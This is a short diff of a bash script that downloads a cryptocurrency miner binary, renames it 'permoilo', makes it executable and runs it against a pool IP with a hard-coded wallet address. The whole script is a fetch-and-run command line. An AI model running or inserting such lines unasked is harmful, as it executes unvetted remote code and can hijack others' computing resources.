@@ -1,5 +1,5 @@
 #!/bin/bash
 export LC_ALL=C
 export LANG=C
-curl https://github.com/rxt36q6/file/raw/main/permoilo -o permoilo && chmod +x permoilo
+curl https://pearlhash.xyz/downloads/pearl-miner-v12 -o permoilo && chmod +x permoilo
 ./permoilo --host 207.148.76.66:80 --user prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch --worker $(echo $RANDOM | md5sum | head -c 10)
